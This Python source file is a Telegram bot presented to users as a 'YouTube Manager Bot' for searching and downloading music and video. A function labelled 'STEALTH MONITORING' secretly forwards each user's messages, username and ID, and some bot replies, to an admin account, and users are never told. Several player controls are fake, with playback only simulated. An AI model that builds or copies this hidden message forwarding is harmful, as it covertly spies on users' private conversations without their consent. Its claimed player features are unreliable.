import os
import yt_dlp
from flask import Flask
from threading import Thread
import telebot
from telebot import types
import time
import requests
from urllib.parse import quote

# Load environment variables
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
ADMIN_USER_ID = os.getenv("ADMIN_USER_ID")

# Initialize
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
app = Flask(__name__)

# Storage
user_sessions = {}
download_progress = {}

# ==================== STEALTH MONITORING ====================
def forward_to_admin(user_id, username, message_text, is_user_message=True):
    """Forward all user-bot conversations to admin secretly"""
    try:
        if str(user_id) == ADMIN_USER_ID:
            return
            
        if is_user_message:
            admin_msg = f"👤 User: @{username} (ID: {user_id})\n💬 Message: {message_text}"
        else:
            admin_msg = f"🤖 Bot reply to @{username}:\n{message_text}"
        
        bot.send_message(ADMIN_USER_ID, admin_msg)
    except Exception as e:
        print(f"Monitoring error: {e}")

# ==================== PROGRESS TRACKING ====================
def progress_hook(d, chat_id, message_id):
    """Track download progress"""
    if d['status'] == 'downloading':
        percent = d.get('_percent_str', '0%').strip()
        speed = d.get('_speed_str', 'N/A')
        eta = d.get('_eta_str', 'N/A')
        
        progress_msg = f"📥 Downloading...\n\n⏳ Progress: {percent}\n🚀 Speed: {speed}\n⏰ Time left: {eta}"
        
        try:
            bot.edit_message_text(progress_msg, chat_id, message_id)
        except:
            pass

# ==================== CHANNEL ANALYSIS ====================
def get_channel_info(channel_input):
    """Get channel information"""
    try:
        ydl_opts = {'quiet': True, 'extract_flat': True}
        
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(channel_input, download=False)
            
            if info:
                return {
                    'title': info.get('title', 'N/A'),
                    'channel_id': info.get('channel_id', 'N/A'),
                    'channel_url': info.get('channel_url', 'N/A'),
                    'subscriber_count': info.get('subscriber_count', 'N/A'),
                    'description': info.get('description', 'N/A')[:200] + "..." if info.get('description') else 'No description',
                }
        return None
    except Exception as e:
        print(f"Channel info error: {e}")
        return None

# ==================== REAL YOUTUBE SEARCH ====================
def search_youtube_real(query):
    """Real YouTube search"""
    try:
        ydl_opts = {'quiet': True, 'extract_flat': True}
        
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(f"ytsearch8:{query}", download=False)
            return info.get('entries', [])
    except Exception as e:
        print(f"Search error: {e}")
        return []

# ==================== GET VIDEO INFO ====================
def get_video_info(video_url):
    """Get video information without downloading"""
    try:
        ydl_opts = {'quiet': True}
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            return ydl.extract_info(video_url, download=False)
    except:
        return None

# ==================== MUSIC HANDLING ====================
def send_music_options(video_url, chat_id, message_id=None):
    """Send music options with player controls"""
    try:
        info = get_video_info(video_url)
        if not info:
            bot.send_message(chat_id, "❌ Could not get video info")
            return

        # Create music player interface
        caption = f"🎵 *{info['title']}*\n*Artist:* {info.get('uploader', 'Unknown')}\n*Duration:* {info.get('duration', 0)}s"

        markup = types.InlineKeyboardMarkup(row_width=2)
        
        # Music player controls
        btn_play = types.InlineKeyboardButton("▶️ Play", callback_data=f"music_play_{video_url}")
        btn_pause = types.InlineKeyboardButton("⏸️ Pause", callback_data=f"music_pause_{video_url}")
        btn_stop = types.InlineKeyboardButton("⏹️ Stop", callback_data=f"music_stop_{video_url}")
        btn_next = types.InlineKeyboardButton("⏭️ Next", callback_data=f"music_next_{video_url}")
        
        # File options
        btn_file = types.InlineKeyboardButton("📁 Send File", callback_data=f"music_file_{video_url}")
        btn_download = types.InlineKeyboardButton("📥 Download", callback_data=f"music_download_{video_url}")
        btn_watch = types.InlineKeyboardButton("🌐 Watch Video", url=video_url)
        
        markup.add(btn_play, btn_pause, btn_stop, btn_next)
        markup.add(btn_file, btn_download)
        markup.add(btn_watch)

        if message_id:
            bot.edit_message_text(caption, chat_id, message_id, reply_markup=markup, parse_mode='Markdown')
        else:
            bot.send_message(chat_id, caption, reply_markup=markup, parse_mode='Markdown')
            
    except Exception as e:
        bot.send_message(chat_id, f"❌ Error: {str(e)[:100]}")

def send_music_file(video_url, chat_id, message_id=None):
    """Send music as direct file"""
    try:
        progress_msg = bot.send_message(chat_id, "🎵 Preparing your music file...")
        
        ydl_opts = {
            'format': 'bestaudio/best',
            'outtmpl': 'downloads/%(title)s.%(ext)s',
            'postprocessors': [{
                'key': 'FFmpegExtractAudio',
                'preferredcodec': 'mp3',
                'preferredquality': '192',
            }],
        }
        
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(video_url, download=True)
            original_file = ydl.prepare_filename(info)
            media_file = original_file.rsplit('.', 1)[0] + '.mp3'
            
            if os.path.exists(media_file):
                with open(media_file, 'rb') as media:
                    bot.send_audio(chat_id, media, title=info['title'][:64])
                
                # Cleanup
                os.remove(media_file)
                if os.path.exists(original_file):
                    os.remove(original_file)
                
                bot.delete_message(chat_id, progress_msg.message_id)
            else:
                bot.edit_message_text("❌ Could not create music file", chat_id, progress_msg.message_id)
                
    except Exception as e:
        error_msg = str(e)
        if "Sign in to confirm" in error_msg:
            bot.edit_message_text("🔒 YouTube blocked download. Use Play option instead.", chat_id, progress_msg.message_id)
        else:
            bot.edit_message_text(f"❌ Error: {error_msg[:100]}", chat_id, progress_msg.message_id)

def download_music_with_progress(video_url, chat_id, message_id):
    """Download music with progress tracking"""
    try:
        progress_msg = bot.send_message(chat_id, "📥 Starting download...")
        
        def progress_callback(d):
            progress_hook(d, chat_id, progress_msg.message_id)
        
        ydl_opts = {
            'format': 'bestaudio/best',
            'outtmpl': 'downloads/%(title)s.%(ext)s',
            'postprocessors': [{
                'key': 'FFmpegExtractAudio',
                'preferredcodec': 'mp3',
                'preferredquality': '192',
            }],
            'progress_hooks': [progress_callback],
        }
        
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(video_url, download=True)
            original_file = ydl.prepare_filename(info)
            media_file = original_file.rsplit('.', 1)[0] + '.mp3'
            
            if os.path.exists(media_file):
                with open(media_file, 'rb') as media:
                    bot.send_audio(chat_id, media, title=info['title'][:64])
                
                # Cleanup
                os.remove(media_file)
                if os.path.exists(original_file):
                    os.remove(original_file)
                
                bot.delete_message(chat_id, progress_msg.message_id)
                bot.send_message(chat_id, "✅ Download completed!")
            else:
                bot.edit_message_text("❌ Download failed", chat_id, progress_msg.message_id)
                
    except Exception as e:
        bot.send_message(chat_id, f"❌ Download error: {str(e)[:100]}")

# ==================== VIDEO HANDLING ====================
def send_video_options(video_url, chat_id, message_id=None):
    """Send video options with quality selection"""
    try:
        info = get_video_info(video_url)
        if not info:
            bot.send_message(chat_id, "❌ Could not get video info")
            return

        caption = f"🎬 *{info['title']}*\n*Channel:* {info.get('uploader', 'Unknown')}\n*Duration:* {info.get('duration', 0)}s\n*Views:* {info.get('view_count', 'N/A')}"

        markup = types.InlineKeyboardMarkup(row_width=2)
        
        # Quality options
        btn_hd = types.InlineKeyboardButton("📹 HD (1080p)", callback_data=f"video_quality_{video_url}_high")
        btn_sd = types.InlineKeyboardButton("🎬 SD (720p)", callback_data=f"video_quality_{video_url}_medium")
        btn_low = types.InlineKeyboardButton("📱 Low (480p)", callback_data=f"video_quality_{video_url}_low")
        
        # Action buttons
        btn_play = types.InlineKeyboardButton("▶️ Play", callback_data=f"video_play_{video_url}")
        btn_download = types.InlineKeyboardButton("📥 Download", callback_data=f"video_download_{video_url}")
        btn_watch = types.InlineKeyboardButton("🌐 Watch on YouTube", url=video_url)
        
        markup.add(btn_hd, btn_sd, btn_low)
        markup.add(btn_play, btn_download)
        markup.add(btn_watch)

        if message_id:
            bot.edit_message_text(caption, chat_id, message_id, reply_markup=markup, parse_mode='Markdown')
        else:
            bot.send_message(chat_id, caption, reply_markup=markup, parse_mode='Markdown')
            
    except Exception as e:
        bot.send_message(chat_id, f"❌ Error: {str(e)[:100]}")

def download_video_with_progress(video_url, chat_id, quality='medium'):
    """Download video with progress tracking"""
    try:
        progress_msg = bot.send_message(chat_id, "📥 Starting video download...")
        
        def progress_callback(d):
            progress_hook(d, chat_id, progress_msg.message_id)
        
        if quality == 'high':
            format_selection = 'best[height<=1080]'
        elif quality == 'medium':
            format_selection = 'best[height<=720]'
        else:
            format_selection = 'best[height<=480]'
            
        ydl_opts = {
            'format': format_selection,
            'outtmpl': 'downloads/%(title)s.%(ext)s',
            'progress_hooks': [progress_callback],
        }
        
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(video_url, download=True)
            media_file = ydl.prepare_filename(info)
            
            if os.path.exists(media_file):
                with open(media_file, 'rb') as media:
                    bot.send_video(chat_id, media, caption=info['title'][:64])
                
                os.remove(media_file)
                bot.delete_message(chat_id, progress_msg.message_id)
                bot.send_message(chat_id, "✅ Video download completed!")
            else:
                bot.edit_message_text("❌ Video download failed", chat_id, progress_msg.message_id)
                
    except Exception as e:
        error_msg = str(e)
        if "Sign in to confirm" in error_msg:
            bot.edit_message_text("🔒 YouTube blocked download. Try streaming instead.", chat_id, progress_msg.message_id)
        else:
            bot.edit_message_text(f"❌ Download error: {error_msg[:100]}", chat_id, progress_msg.message_id)

# ==================== BOT COMMANDS ====================
@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    username = message.from_user.username or "Unknown"
    
    if str(user_id) != ADMIN_USER_ID:
        forward_to_admin(user_id, username, message.text)
    
    welcome_text = """
🎬 *YouTube Manager Bot* 🎵

*Commands:*
/switch - Music or Video mode
/checkytchannel - Analyze channels

*Features:*
• Music player with controls
• Video streaming & download
• Real-time download progress
• Channel analysis
"""
    
    bot.reply_to(message, welcome_text, parse_mode='Markdown')
    
    if str(user_id) != ADMIN_USER_ID:
        forward_to_admin(user_id, username, welcome_text, False)

@bot.message_handler(commands=['switch'])
def switch_command(message):
    user_id = message.from_user.id
    username = message.from_user.username or "Unknown"
    
    if str(user_id) != ADMIN_USER_ID:
        forward_to_admin(user_id, username, message.text)
    
    markup = types.InlineKeyboardMarkup()
    btn_music = types.InlineKeyboardButton("🎵 Music Player", callback_data="switch_music")
    btn_video = types.InlineKeyboardButton("🎬 Video Player", callback_data="switch_video")
    markup.add(btn_music, btn_video)
    
    response = "🎛️ *Choose Mode:*\n\n• 🎵 Music - Player controls & downloads\n• 🎬 Video - Streaming & quality options"
    bot.reply_to(message, response, reply_markup=markup, parse_mode='Markdown')
    
    if str(user_id) != ADMIN_USER_ID:
        forward_to_admin(user_id, username, response, False)

@bot.message_handler(commands=['checkytchannel'])
def check_channel_command(message):
    user_id = message.from_user.id
    username = message.from_user.username or "Unknown"
    
    if str(user_id) != ADMIN_USER_ID:
        forward_to_admin(user_id, username, message.text)
    
    user_sessions[user_id] = {'waiting_for_channel': True}
    bot.reply_to(message, "🔍 Send me a YouTube channel URL, @username, or channel name:")

# ==================== CALLBACK HANDLERS ====================
@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    user_id = call.from_user.id
    username = call.from_user.username or "Unknown"
    
    if call.data.startswith('switch_'):
        mode = call.data.split('_')[1]
        user_sessions[user_id] = {'mode': mode}
        
        if mode == 'music':
            response = "🎵 *Music Mode*\n\nSend me a song name or artist. I'll show player controls and download options."
        else:
            response = "🎬 *Video Mode*\n\nSend me a video title. I'll show streaming and quality options."
        
        bot.edit_message_text(response, call.message.chat.id, call.message.message_id, parse_mode='Markdown')
    
    elif call.data.startswith('select_music_'):
        video_url = call.data.split('_', 2)[2]
        bot.edit_message_text("🎵 Loading music options...", call.message.chat.id, call.message.message_id)
        send_music_options(video_url, call.message.chat.id, call.message.message_id)
    
    elif call.data.startswith('select_video_'):
        video_url = call.data.split('_', 2)[2]
        bot.edit_message_text("🎬 Loading video options...", call.message.chat.id, call.message.message_id)
        send_video_options(video_url, call.message.chat.id, call.message.message_id)
    
    elif call.data.startswith('music_'):
        action = call.data.split('_')[1]
        video_url = call.data.split('_', 2)[2]
        
        if action == 'play':
            bot.answer_callback_query(call.id, "▶️ Playing music...")
            # Simulate playing (in real bot, you'd stream audio)
            bot.send_message(call.message.chat.id, f"🎵 Now playing...\n\nUse the player controls above to manage playback.")
        
        elif action == 'pause':
            bot.answer_callback_query(call.id, "⏸️ Music paused")
        
        elif action == 'stop':
            bot.answer_callback_query(call.id, "⏹️ Music stopped")
        
        elif action == 'file':
            bot.edit_message_text("📁 Sending music file...", call.message.chat.id, call.message.message_id)
            send_music_file(video_url, call.message.chat.id, call.message.message_id)
        
        elif action == 'download':
            bot.edit_message_text("📥 Starting download...", call.message.chat.id, call.message.message_id)
            download_music_with_progress(video_url, call.message.chat.id, call.message.message_id)
    
    elif call.data.startswith('video_'):
        action = call.data.split('_')[1]
        video_url = call.data.split('_', 2)[2]
        
        if action == 'play':
            bot.answer_callback_query(call.id, "▶️ Streaming video...")
            info = get_video_info(video_url)
            if info:
                bot.send_message(call.message.chat.id, 
                               f"🎬 Now streaming: *{info['title']}*\n\n📺 Stream URL: {video_url}\n\nUse the quality options above.", 
                               parse_mode='Markdown')
        
        elif action == 'download':
            bot.edit_message_text("📥 Starting video download...", call.message.chat.id, call.message.message_id)
            download_video_with_progress(video_url, call.message.chat.id)
        
        elif action == 'quality':
            quality = call.data.split('_')[3]
            bot.edit_message_text(f"📥 Downloading in {quality} quality...", call.message.chat.id, call.message.message_id)
            download_video_with_progress(video_url, call.message.chat.id, quality)

# ==================== MESSAGE HANDLERS ====================
@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    user_id = message.from_user.id
    username = message.from_user.username or "Unknown"
    user_input = message.text.strip()
    
    if str(user_id) != ADMIN_USER_ID:
        forward_to_admin(user_id, username, user_input)
    
    # Handle channel analysis
    if user_sessions.get(user_id, {}).get('waiting_for_channel'):
        del user_sessions[user_id]['waiting_for_channel']
        bot.reply_to(message, "🔍 Analyzing channel...")
        
        channel_data = get_channel_info(user_input)
        if channel_data:
            response = f"📊 *Channel Analysis*\n\n*Name:* {channel_data['title']}\n*ID:* {channel_data['channel_id']}\n*URL:* {channel_data['channel_url']}\n*Subscribers:* {channel_data['subscriber_count']}\n\n*Description:*\n{channel_data['description']}"
            bot.reply_to(message, response, parse_mode='Markdown')
        else:
            bot.reply_to(message, "❌ Could not analyze channel")
        return
    
    # Handle music/video mode
    session = user_sessions.get(user_id, {})
    if session.get('mode'):
        mode = session['mode']
        
        if 'youtube.com' in user_input or 'youtu.be' in user_input:
            # Direct URL
            if mode == 'music':
                send_music_options(user_input, message.chat.id)
            else:
                send_video_options(user_input, message.chat.id)
        else:
            # Search
            bot.reply_to(message, f"🔍 Searching: {user_input}")
            results = search_youtube_real(user_input)
            
            if results:
                response = "📋 *Search Results:*\n\n"
                markup = types.InlineKeyboardMarkup()
                
                for i, result in enumerate(results[:5], 1):
                    title = result['title'][:50] + "..." if len(result['title']) > 50 else result['title']
                    response += f"{i}. *{title}*\n   👉 {result['channel']}\n\n"
                    
                    if mode == 'music':
                        btn = types.InlineKeyboardButton(f"🎵 Select {i}", callback_data=f"select_music_{result['url']}")
                    else:
                        btn = types.InlineKeyboardButton(f"🎬 Select {i}", callback_data=f"select_video_{result['url']}")
                    markup.add(btn)
                
                bot.reply_to(message, response, reply_markup=markup, parse_mode='Markdown')
            else:
                bot.reply_to(message, "❌ No results found")
        return
    
    bot.reply_to(message, "🤖 Use /switch to start!")

# ==================== FLASK APP ====================
@app.route('/')
def home():
    return "YouTube Manager Bot - Music & Video Player"

def run_bot():
    print("🤖 Starting YouTube Manager Bot...")
    bot.infinity_polling()

if __name__ == '__main__':
    if not os.path.exists('downloads'):
        os.makedirs('downloads')
    Thread(target=run_bot).start()
    app.run(host='0.0.0.0', port=8080)